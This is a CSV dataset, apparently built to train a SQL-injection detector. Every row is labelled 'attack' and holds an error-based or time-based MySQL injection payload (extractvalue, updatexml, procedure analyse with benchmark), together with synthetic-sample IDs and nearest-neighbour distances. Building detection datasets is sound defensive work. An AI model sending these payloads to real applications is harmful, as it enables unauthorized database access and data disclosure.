id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000001,attack,error,"1'+  (  select 'vbqo' where 5630  =  5630 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000047,1.0533362334241718
SMOTE_000002,attack,error,"1 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  ",nearest_attack_euclidean,R000224,0.7758042461127853
SMOTE_000003,attack,error,"1'   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'mexd' like 'mexd",nearest_attack_euclidean,R000155,0.23980289018086948
SMOTE_000004,attack,error,"1%' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and '%'  =  '",nearest_attack_euclidean,R000234,0.5363023974587114
SMOTE_000005,attack,error,"1"" where 3933  =  3933 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R000129,0.0910084333295075
SMOTE_000006,attack,error,"1 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000156,0.518893665404159
SMOTE_000007,attack,error,"1'   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'skdm'  =  'skdm",nearest_attack_euclidean,R000099,0.36486187308395135
SMOTE_000008,attack,error,"1%'   )    )     )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000199,0.8458828517055843
SMOTE_000009,attack,error,"1""  )   where 1614  =  1614 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R000134,0.6957798649959017
SMOTE_000010,attack,error,"1 where 6369  =  6369 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",nearest_attack_euclidean,R000138,0.8143412178293129
SMOTE_000011,attack,error,"1"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""ymwb""  =  ""ymwb",nearest_attack_euclidean,R000241,0.22081565256557897
SMOTE_000012,attack,error,"1%""   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000229,0.14262420417538613
SMOTE_000013,attack,error,"1%""   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000278,0.27903560410962364
SMOTE_000014,attack,error,"1'   )    )    as namw where 1740  =  1740 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",nearest_attack_euclidean,R000089,0.13019925851303443
SMOTE_000015,attack,error,"1  )   where 8734  =  8734 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000132,0.200058816627812
SMOTE_000016,attack,error,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",nearest_attack_euclidean,R000298,0.0533934996843248
SMOTE_000017,attack,error,"1  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  ",nearest_attack_euclidean,R000063,0.5443386874600551
SMOTE_000018,attack,error,"1""   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   ""nzhj"" like ""nzhj",nearest_attack_euclidean,R000135,0.5665987503805233
SMOTE_000019,attack,error,"1"" where 4445  =  4445 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",nearest_attack_euclidean,R000232,0.5535562129588741
